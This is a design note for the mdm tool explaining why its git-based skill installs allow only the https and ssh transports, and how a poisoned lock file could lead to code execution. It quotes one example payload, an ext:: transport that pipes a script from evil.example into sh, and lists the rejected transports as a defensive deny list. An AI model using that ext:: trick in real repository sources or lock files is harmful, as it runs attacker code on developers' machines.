# Git transport restrictions

mdm installs skills from git repositories by shelling out to the `git` binary
(`git clone`, `git ls-remote`). To do that safely, mdm restricts which git
**transports** it will use to **https** and **ssh** only.

## Why this matters

A git "URL" is not always a network address. Git supports pluggable
*remote helpers*, and two of them run local commands instead of talking to a
server:

| Transport | Behavior |
|---|---|
| `ext::<command>` | Runs `<command>` as the transport — i.e. the "URL" is an arbitrary shell command. |
| `fd::<n>` | Communicates with git over already-open file descriptors. |

Because of `ext::`, a string like the following is not a clone — it is code
execution:

```text
ext::sh -c "curl https://evil.example/x.sh | sh"
```

This is a documented git feature, not a git bug. The risk for mdm is that a
repository source string is **untrusted input**:

- `mdm skills add <source>` takes the source from the command line.
- `mdm skills install` and `mdm skills update` **replay the `source` field
  stored in `skills-lock.json`** — a file that is commonly committed to a repo
  and shared across a team.

Without a restriction, a poisoned `skills-lock.json` entry (or a crafted
"install this" snippet) could turn a routine `mdm skills install` during
onboarding into remote code execution on the developer's machine.

## What mdm enforces

Only the `https` and `ssh` transports are permitted. Everything else is
rejected before mdm ever invokes git:

- ✅ `https://github.com/owner/repo.git`
- ✅ `ssh://git@github.com/owner/repo.git`
- ✅ `git@github.com:owner/repo.git` (scp-like syntax, uses ssh)
- ❌ `ext::…`, `fd::…` — local-command transports
- ❌ `git://…`, `http://…`, `file://…` — disallowed schemes
- ❌ any value beginning with `-` — could be misread by git as an option flag

Enforcement happens at two layers:

1. **`GIT_ALLOW_PROTOCOL=https:ssh`** is set on every git subprocess mdm spawns.
   This is git's own allowlist mechanism, and it is inherited by submodule and
   recursive operations — so it holds even for git URLs that mdm's own parser
   never saw.
2. **A pre-flight check** in the git package rejects disallowed transports with
   a clear error before shelling out, and mdm passes `--` before positional
   arguments so a leading-`-` value can't be interpreted as a flag.

## Why https and ssh only

- **https** covers the overwhelmingly common case: public repos and
  token-authenticated private repos.
- **ssh** covers private repos authenticated with the user's existing keys,
  including scp-like `git@host:owner/repo.git` URLs.
- **`git://`** is unauthenticated and unencrypted, offering no integrity
  guarantees, so it is intentionally excluded.
- **`http://`** is plaintext and MITM-able; require `https://` instead.
- **`ext::` / `fd::` / `file://`** are local-resource transports with no
  legitimate use for fetching a remote skill, and `ext::` is a direct code
  execution primitive.

If you have a genuine need for another transport, clone the repository yourself
and install from the local path (`mdm skills add ./path/to/repo`) instead.
